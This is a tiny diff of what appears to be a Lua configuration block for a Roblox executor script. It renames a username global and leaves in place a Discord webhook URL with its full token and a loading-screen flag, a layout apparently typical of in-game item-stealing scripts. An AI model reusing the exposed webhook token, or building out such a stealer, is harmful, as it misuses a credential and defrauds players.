@@ -1,4 +1,4 @@
-_G.Username = "Jason75ke57"
+_G.UserName = "Jason75ke57"
 _G.Webhook = "https://discord.com/api/webhooks/1124013064015057008/TuRQboyoK04Zjg0-NENJXzI49CY69K12P8ndMmnWIMHWoAjyNagNHGlz6vxfY2yYSKcS"
 
 _G.LoadingScreen = true 
